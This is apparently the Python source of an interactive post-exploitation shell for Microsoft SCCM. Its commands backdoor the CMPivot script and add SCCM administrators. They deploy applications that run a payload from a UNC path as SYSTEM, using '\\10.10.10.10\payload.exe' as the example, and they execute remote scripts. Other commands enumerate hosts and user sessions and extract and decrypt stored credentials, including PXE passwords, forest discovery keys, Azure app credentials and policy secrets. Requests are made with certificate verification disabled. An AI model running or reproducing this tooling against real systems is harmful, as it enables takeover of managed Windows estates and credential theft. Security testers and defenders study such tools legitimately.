import cmd2
import pandas as dp
import requests
import traceback
import argparse
from requests_ntlm import HttpNtlmAuth
from requests_gssapi import HTTPSPNEGOAuth
from binascii import unhexlify
from urllib3.exceptions import InsecureRequestWarning
from tabulate import tabulate
from lib.scripts.banner import show_banner
from lib.logger import logger
from lib.scripts.runscript import SMSSCRIPTS
from lib.scripts.backdoor import BACKDOOR
from lib.scripts.pivot import CMPIVOT
from lib.scripts.add_admin import ADD_ADMIN
from lib.scripts.application import SMSAPPLICATION
from lib.attacks.admin import DATABASE
from lib.scripts.themanager import SPEAKTOTHEMANAGER
import os


# #add debugging
class SHELL(cmd2.Cmd):
    SA = "Situational Awareness Commands"
    PE = "PostEx Commands"
    DB = "Database Commands"
    IN = "Interface Commands"
    CE = "Credential Extraction Commands"
    hidden = ["alias", "help", "macro", "run_pyscript", "set", "shortcuts", "edit", "history", "quit", "run_script", "shell", "_relative_run_script", "eof"]
    
    
    application_parser = argparse.ArgumentParser()
    application_parser.add_argument('-t', '--target', action='store', help="ResourceID to target for application deployment")
    application_parser.add_argument('-c', '--collection-type', action='store', help='Collection type to create for application deployment', choices=['user', 'device'])
    application_parser.add_argument('-p', '--path', action="store", help='Command or UNC path of the binary/script to execute. Ex: \\\\10.10.10.10\\payload.exe')
    application_parser.add_argument('-s', '--system', action="store_true", help='Run the application as NT AUTHORITY\\SYSTEM', default=False)
    application_parser.add_argument('-n', '--name', action="store", help="Name of the application")

    def __init__(self, username, password, target, logs_dir, auser, apassword, auth, auser_auth, ccache_files):
        #initialize plugins
        self.pivot = CMPIVOT(auth=auth,target = target, logs_dir = logs_dir)
        self.script = SMSSCRIPTS(auth=auth, target = target, logs_dir = logs_dir, auser_auth = auser_auth)
        self.backdoor = BACKDOOR(auth=auth, target = target, logs_dir = logs_dir, auser_auth = auser_auth)
        self.admin = ADD_ADMIN(auth=auth,target_ip=target, logs_dir=logs_dir)
        self.db = DATABASE(auth=auth, url=target, logs_dir=logs_dir)
        self.application = SMSAPPLICATION(auth=auth, target=target, logs_dir=logs_dir)
        self.karen = SPEAKTOTHEMANAGER(auth=auth, target=target)
        
        #initialize cmd
        super().__init__(allow_cli_args=False)
        self.hidden_commands = self.hidden
        self.username = username
        self.password = password
        self.auth = auth
        self.target = target
        self.logs_dir = logs_dir
        self.headers = {'Content-Type': 'application/json; odata=verbose'} # modify useragent? currently shows python useragent in logs
        self.intro = logger.info('[!] Enter help for extra shell commands')
        self.cwd = "C:\\"
        self.device = ""
        self.prompt = f"({self.device}) {self.cwd} >> "
        self.hostname = ""
        self.approve_user = auser
        self.approve_password = apassword
        self.ccache_files = ccache_files


# ############
# cmd2 Settings
# ############

    def emptyline(self):
        pass

    def postcmd(self, stop, arg):
        self.prompt = f"({self.device}) ({self.cwd}) >> "
        return stop

    @cmd2.with_category(IN)
    def do_interact(self, arg):
        """Target Device/Collection to Query         interact (device code)"""
        option = arg.split(' ')
        self.device = option[0]

    @cmd2.with_category(IN)
    def do_exit(self, arg):
        """Exit the console."""
        for f in self.ccache_files:
            os.remove(f)
        return True 
    
    @cmd2.with_category(SA)
    def do_cd(self, arg):
        """Change current working directory."""
        #path needs to end with \ or all file system queries will fail
        if not arg.endswith("\\"): 
            arg = arg + "\\"
        self.cwd = arg

# ############
# Database Section
# ############

    @cmd2.with_category(DB)
    def do_get_device(self, arg):
        """Query specific device information"""
        self.db.devices(arg)
    
    @cmd2.with_category(DB)
    def do_get_user(self, arg):
        """Query specific user information"""
        self.db.users(arg)

    @cmd2.with_category(DB)
    def do_get_collection(self, arg):
        """Query for all (*) or single (id) collection(s)"""
        option = arg.split(' ')
        collection_id = option[0]
        self.db.collections(collection_id)

    @cmd2.with_category(DB)
    def do_get_collectionmembers(self, arg):
        """Query for all members of a colection. Warning: could be heavy"""
        option = arg.split(' ')
        collection_id = option[0]
        self.db.collection_member(collection_id)
    
    @cmd2.with_category(DB)
    def do_get_puser(self, arg):
        """Query for devices the target is a primary user"""
        self.db.pusers(arg)

    @cmd2.with_category(DB)
    def do_get_lastlogon(self, arg):
        """Query for devices the target recently signed in"""
        self.db.last_logon(arg)


# ############
# Application Section
# ############




    @cmd2.with_category(PE)
    @cmd2.with_argparser(application_parser)
    def do_application(self, args):
        """Run application on target                     script (/path/to/script) """
        self.application.run(path=args.path, runas_user=args.system, name=args.name, collection_type=args.collection_type, target_resource=args.target)

    # @cmd2.with_argparser(movegroup_parser)   
    # def do_movegroup(self, args):
    #     """Move a group to a node"""
    #     group_name, node_name = args.group, args.node

# ############
# PowerShell Script Section
# All modules will call and execute script from the lib.scripts directory
# ############

    @cmd2.with_category(SA)    
    def do_cat(self, arg):
        """Read file contents.                      cat (filename)"""
        filename = arg
        logger.info(f"Tasked SCCM to show {arg}")
        fullpath = self.cwd + filename
        self.script.cat(fullpath, device=self.device)
    
    @cmd2.with_category(PE)
    def do_script(self, arg):
        """Run script on target                     script (/path/to/script) """
        option = arg.split(' ')
        scriptpath = option[0]
        self.script.run(device=self.device, optional_target=scriptpath)

    @cmd2.with_category(PE)
    def do_list_scripts(self, arg):
        """List scripts. """
        self.script.list_scripts()

    @cmd2.with_category(PE)
    def do_delete_script(self, arg):
        """Delete a script from the SCCM server.    delete_script (GUID)"""
        option = arg.split(' ')
        guid = option[0]
        self.script.delete_script(guid)

    @cmd2.with_category(PE)
    def do_get_script(self, arg):
        """Get a script from the SCCM server.       get_script (GUID)"""
        option = arg.split(' ')
        guid = option[0]
        self.script.get_script(guid)


# ############
# CMPivot Backdoor Section
# Backdoor existing CMPivot script with your own
# ############
    
    @cmd2.with_category(PE)
    def do_backdoor(self, arg):
        """Backdoor CMPivot Script                  backdoor (/path/to/script)"""
        logger.info("Tasked SCCM to backdoor CMPivot with provided script")
        check = input("IMPORTANT: Did you backup the script first? There is no going back without it. Y/N?")
        if check.lower() == "y":
            option = arg.split(' ')
            scriptpath = option[0]
            self.backdoor.run(option="backdoor", scriptpath=scriptpath)

        else:
            return
    
    @cmd2.with_category(PE)
    def do_restore(self, arg):
        """Restore original CMPivot Script"""
        logger.info("Tasked SCCM to restore the original CMPivot script.")
        option = arg.split(' ')
        self.backdoor.run(option="restore", scriptpath=None)

    @cmd2.with_category(PE)
    def do_backup(self, arg):
        """Backup original CMPivot Script"""
        logger.info("Tasked SCCM to backup the CMPivot script.")
        option = arg.split(' ')
        self.backdoor.run(option="backup", scriptpath=None)

# ############
# CMPivot Section
# All modules will call built-in CMPivot queries
# ############

    @cmd2.with_category(SA)
    def do_administrators(self, arg):
        """Query local administrators on target"""
        logger.info("Tasked SCCM to run Administrators.")
        self.pivot.administrators(device=self.device)
    
    @cmd2.with_category(SA)
    def do_ipconfig(self, arg):
        """Run ipconfig on target"""
        logger.info("Tasked SCCM to run IPCONFIG.")
        self.pivot.ipconfig(device=self.device)

    @cmd2.with_category(SA)
    def do_shares(self, arg):
        """List file shares hosted on target."""
        logger.info("Tasked SCCM to list file shares.")
        self.pivot.file_share(device=self.device)

    @cmd2.with_category(SA)
    def do_services(self, arg):
        """List running services on target."""
        logger.info("Tasked SCCM to list services.")
        self.pivot.services(device=self.device)
    
    @cmd2.with_category(SA)
    def do_ps(self, arg):
        """List running processes on target."""
        logger.info("Tasked SCCM to list processes.")
        self.pivot.process(device=self.device)

    @cmd2.with_category(SA)
    def do_console_users(self, arg):
        """Show total time any users has logged on to the target."""
        logger.info("Tasked SCCM to show all users that have signed in.")
        self.pivot.system_console_user(device=self.device)

    @cmd2.with_category(SA)
    def do_ls(self, arg):
        """List files in current working directory."""
        logger.info(f"Tasked SCCM to list files in {self.cwd}.")
        path = self.cwd + "*"
        self.pivot.file(arg=path, device=self.device)

    @cmd2.with_category(SA)
    def do_list_disk(self, arg):
        """Show drives mounted to the target system."""
        logger.info(f"Tasked SCCM to show mounted drives on {self.device}.")
        self.pivot.logical_disk(device=self.device)

    @cmd2.with_category(SA)
    def do_software(self, arg):
        """Show installed software on the target system."""
        logger.info(f"Tasked SCCM to list software installed {self.device}.")
        self.pivot.installed_software(device=self.device)   

    @cmd2.with_category(SA)
    def do_sessions(self, arg):
        """Show users with an active session on the target system."""
        logger.info(f"Tasked SCCM to show users currently signed in to {self.device}.")
        self.pivot.user(device=self.device)   

    @cmd2.with_category(SA)
    def do_osinfo(self, arg):
        """Show OS info of target system."""
        logger.info(f"Tasked SCCM to show system info of {self.device}.")
        self.pivot.osinfo(device=self.device)

    @cmd2.with_category(SA)
    def do_environment(self, arg):
        """Show configured environment variables on target."""
        logger.info(f"Tasked SCCM to show Environment variables of {self.device}.")
        self.pivot.environment(device=self.device)

    @cmd2.with_category(SA)
    def do_disk(self, arg):
        """Show disk information on the target."""
        logger.info(f"Tasked SCCM to show disk information of {self.device}.")
        self.pivot.disk(device=self.device)

    @cmd2.with_category(SA)
    def do_sessionhunter(self, arg):
        user = arg.split(' ')[0]
        """Search for all systems a target user has a current session on"""
        self.pivot.sessionhunter(self.device, user)

# ############
# Add Admin Section
# ############

    @cmd2.with_category(PE)
    def do_add_admin(self, arg):
        """Add SCCM Admin                           add_admin (user) (sid)"""
        option = arg.split(' ')
        targetuser = option[0]
        targetsid = option[1]
        logger.info(f"Tasked SCCM to add {targetuser} as an administrative user.")
        self.admin.add(targetuser=targetuser, targetsid=targetsid)
    
    @cmd2.with_category(PE)
    def do_delete_admin(self, arg):
        """Remove SCCM Admin                        delete_admin (user)"""
        option = arg.split(' ')
        targetuser = option[0]
        if len(targetuser) >= 1:
            logger.info(f"Tasked SCCM to remove {targetuser} as an administrative user.")
            self.admin.delete(targetuser=targetuser)
        else:
            logger.info("A target user or group is required.")
            return
        
    @cmd2.with_category(PE)
    def do_show_admins(self, arg):
        """List admin users                         show_admins"""
        logger.info(f"Tasked SCCM to list current SMS Admins.")
        self.admin.show_admins()

    @cmd2.with_category(PE)
    def do_show_rbac(self, arg):
        """List users and their roles               show_rbac"""
        logger.info(f"Tasked SCCM to list all RBAC")
        self.admin.show_rbac()


    

# ############
# Other PostEx that doens't fit anywhere else
# ############

    @cmd2.with_category(PE)
    def do_show_consoleconnections(self, arg):
        """List console sessions and source         show_consoleconnections"""
        logger.info(f"Tasked SCCM to list all SCCM console connections")
        self.admin.show_consoleconnections()
        
    @cmd2.with_category(PE)
    def do_get_sccmversion(self, arg):
        """Show current version of SCCM                     get_sccmversion"""
        logger.info(f"Tasked SCCM to show console version")
        self.admin.get_sccmversion()
    @cmd2.with_category(PE)
    def do_get_consoleinstaller(self, arg):
        """Show current version of SCCM                    get_consoleinstaller"""
        logger.info(f"Downloading adminconsole installation files")
        self.admin.get_consoleinstaller()


# ############
# Creds Extraction
# ############

    @cmd2.with_category(CE)
    def do_get_creds(self, arg):
        """Extract encrypted cred blobs                     get_creds"""
        logger.info("Tasked SCCM to extract all encrypted credential blobs")
        self.admin.get_creds()

    @cmd2.with_category(CE)
    def do_get_pxepassword(self, arg):
        """Extract pxeboot encrypted cred blobs             get_pxepassword"""
        logger.info("Tasked SCCM to extract PXE boot password credential blobs")
        self.admin.get_pxepass()
    
    @cmd2.with_category(CE)
    def do_get_forestkey(self, arg):
        """Extract forest discovery session key blobs       get_forestkey"""
        logger.info("Tasked SCCM to extract forest session key blobs")
        self.admin.get_forestkey()

    @cmd2.with_category(CE)
    def do_get_azurecreds(self, arg):
        """Extract Azure application cred blobs             get_azurecreds"""
        logger.info("Tasked SCCM to extract Azure app credential blobs")
        self.admin.get_azurecreds()

    @cmd2.with_category(CE)
    def do_get_azuretenant(self, arg):
        """Get Azure Tenant Info                            get_azuretenant"""
        logger.info("Tasked SCCM to extract tenant info.")
        self.admin.get_azuretenant()
    
    @cmd2.with_category(CE)
    def do_decrypt(self, arg):
        """Decrypt provided encrypted blob                  decrypt [blob]"""
        logger.info("Tasked SCCM to decrypt credential blob")
        option = arg.split(' ')
        blob = option[0]
        if self.device == "":
            logger.info("Device ID not found. Decryptiong requires site server device ID")
        else:
            self.script.decrypt(blob=blob, device=self.device)
    
    @cmd2.with_category(CE)
    def do_speak_to_the_manager(self, arg):
        """Dump policy credentials                          speak_to_the_manager"""
        logger.info("Tasked SCCM to find a manager.")
        self.karen.run()


    @cmd2.with_category(CE)
    def do_decryptEx(self, arg):
        """Decrypt provided blob with session key           decryptEx [session key] [blob]"""
        logger.info("Tasked SCCM to decrypt credential with session key blob")
        option = arg.split(' ')
        skey = option[0]
        blob = option[1]
        if self.device == "":
            logger.info("Device ID not found. Decryptiong requires site server device ID")
        else:
            self.script.decryptEx(session_key=skey,encrypted_blob=blob,device=self.device)




class CONSOLE:
    def __init__(self, username=None, password=None, domain=None, kerberos=None, dcip=None, ip=None, debug=False, logs_dir=None, auser=None, apassword=None, auth=None):
        self.username = username
        self.password = password
        self.url = ip
        self.domain = domain
        self.kerberos = kerberos
        self.dcip = dcip
        self.debug = debug
        self.lmhash = ''
        self.nthash = ''
        self.logs_dir = logs_dir
        self.approve_user = auser
        self.approve_password = apassword
        self.auser_auth = ''
        self.ccache_files = []

        if(kerberos):
            try:
                self.auth = self.kerberos_auth(self.username, self.password, self.nthash, self.lmhash)
            except Exception as e:
                logger.info("Kerberos authentication failed. Check your credentials")
                logger.info(e)
            try:
                if self.approve_user:
                    self.auser_auth = self.kerberos_auth(self.approve_user, self.approve_password)
            except Exception as e:
                logger.info("Kerberos authentication failed. Check your approval credentials")
                logger.info("Script execution will fail if approval is required.")
                logger.info(e)
        else:
            self.auth = HttpNtlmAuth(self.username, self.password)
            if self.approve_user: 
                self.auser_auth =  HttpNtlmAuth(self.approve_user, self.approve_password)
    
    def run(self):
        try:
            endpoint = f"https://{self.url}/AdminService/wmi/"
            if self.auser_auth:
                r = requests.request("GET",
                                endpoint,
                                auth=self.auser_auth,
                                verify=False)
                if r.status_code == 401:
                    logger.info("Got error code 401: Access Denied. Check your approver credentials.")
                    logger.info("Script execution will fail if approval is required.")
      
            r = requests.request("GET",
                            endpoint,
                            auth=self.auth,
                            verify=False)
            
            if r.status_code == 200:
                self.cli()
            elif r.status_code == 401:
                logger.info("Got error code 401: Access Denied. Check your credentials.")
                logger.info(r.content)
                logger.info(r)
            else:
                logger.info(r.text)
        except Exception as e:
            logger.info("An unknown error occurred, use -debug to print the response")
            logger.info(e)
    
    def cli(self):
        cli = SHELL(self.username, self.password, self.url, self.logs_dir, self.approve_user, self.approve_password, self.auth, self.auser_auth, self.ccache_files)
        cli.cmdloop()

    def kerberos_auth(self, username, password, nthash='', lmhash = ''):
        # Importing down here so pyasn1 is not required if kerberos is not used.
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.ccache import CCache
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        from binascii import a2b_hex
        import gssapi
        import tempfile

        # If TGT or TGS are specified, they are in the form of:
        # TGS['KDC_REP'] = the response from the server
        # TGS['cipher'] = the cipher used
        # TGS['sessionKey'] = the sessionKey
        # If we have hashes, normalize them
        if lmhash != '' or nthash != '':
            if len(lmhash) % 2:
                lmhash = '0%s' % lmhash
            if len(self.nthash) % 2:
                nthash = '0%s' % nthash
            try: # just in case they were converted already
                lmhash = a2b_hex(lmhash)
                nthash = a2b_hex(nthash)
            except:
                pass

        # First of all, we need to get a TGT for the user
        principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(principal, password, self.domain, lmhash, nthash, kdcHost=self.dcip)

        ccache = CCache()
        ccache.fromTGT(tgt, oldSessionKey, sessionKey)
        tmp = tempfile.NamedTemporaryFile(delete=False)
        ccache.saveFile(tmp.name)

        creds = gssapi.Credentials(
        usage="initiate",
        store={
        "ccache": f"FILE:{tmp.name}"
        }
        )

        self.ccache_files.append(tmp.name)
        auth = HTTPSPNEGOAuth(creds=creds)
        return auth
    
if __name__ == '__main__':
    import sys
    c = CMD()
    sys.exit(c.cmdloop())                                                                                                                                                                                                                            


    
                                                                                                                                                                                                                           
